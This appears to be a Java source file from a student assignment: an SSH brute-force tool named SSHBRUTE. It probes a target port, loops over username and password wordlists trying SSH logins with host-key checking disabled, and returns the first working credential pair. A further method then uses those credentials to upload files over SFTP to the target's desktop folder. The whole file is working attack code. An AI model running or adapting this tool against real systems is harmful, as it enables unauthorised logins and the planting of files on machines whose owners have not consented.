/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Assignment5;
//libraries
import java.net.Socket;
import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;
import java.io.FileReader;
import java.io.IOException;
import java.io.BufferedReader;
import com.jcraft.jsch.*;
/**
 * class for Port scanning
 * @author Alexey Titov
 * @version 2.0
 */
public class SSHBRUTE {
    /**
     * the function checking host
     * @param host IP
     * @param port open port
     */
    public static void checkHost(String host,int port)
    {
        try {
            System.out.print("checking host..");
            Socket checkSock=new Socket();
            checkSock.connect(new InetSocketAddress(host,port),1000);
            checkSock.close();
            System.out.println("success");
        }catch(IOException e){
            System.out.println("fail");
            System.exit(1);
        }
    }	
    /**
     * the function reading wordlist
     * @param path to file
     * @return list of words
     */
    public ArrayList<String> getWordlist(String path)
    {
        System.out.print("reading wordlist..");
        ArrayList<String> wordlist=new ArrayList<String>();
        try {
            BufferedReader buffRead=new BufferedReader(new FileReader(path));
            String line=null;
            while((line=buffRead.readLine())!=null) {
                wordlist.add(line);
            }
            buffRead.close();
            System.out.println("done");
        }catch(Exception e){
            System.out.println("fail");
            System.exit(1);
        }
        return wordlist;
    }
    /**
     * the function crack password
     * @param host IP
     * @param user USERNAME
     * @param pass password
     * @param port SSH port
     * @return true if connection established
     */
    public boolean crackPass(String host,String user,String pass,int port)
    {
        try {
            JSch jsch = new JSch();
            Session session = jsch.getSession(user, host, port);
            session.setPassword(pass);
            session.setConfig("StrictHostKeyChecking", "no");
            session.connect();
            session.disconnect();
        }catch(Exception e){
            return false;
        }
        return true;
    }
    /**
     * the function check connect, crack password and send 4 files
     * @param args IP,User list, password list, open port
     * @return USERNAME@password
     */
    public String BFssh(String[] args) {
        String targetIP,answer="brutforce failed";
        int targetPort;
        targetIP=args[0];
        targetPort=Integer.parseInt(args[1]);
        checkHost(targetIP, targetPort);
        ArrayList<String> userlist=getWordlist(args[2]);
        ArrayList<String> wordlist=getWordlist(args[3]);
        for (int j = 0; j < userlist.size(); j++)
            for (int i = 0; i < wordlist.size(); i++) 
                if(crackPass(targetIP, userlist.get(j), wordlist.get(i),22))
                {
                    answer=userlist.get(j)+"@"+wordlist.get(i);
                    return answer;
                }
        return answer;
    }
    /**
     * the function send 4 files
     * @param args data for ssh connect
     */
    public void conect(ArrayList<String> args)
    {
        try{
            JSch jsch=new JSch();
            Session tryPass=jsch.getSession(args.get(1), args.get(0), 22);
            tryPass.setPassword(args.get(2));
            tryPass.setConfig("StrictHostKeyChecking", "no");
            tryPass.connect(30000);
            ChannelSftp sftp=(ChannelSftp)tryPass.openChannel("sftp");
            sftp.connect();
            for(int i=3;i<args.size();i++)
            {
                sftp.put(args.get(i),"/home/network/Desktop");
                TimeUnit.SECONDS.sleep(1);
            }
            tryPass.disconnect();
        }catch(Exception e){
            System.out.println(e);  
        }
    }
}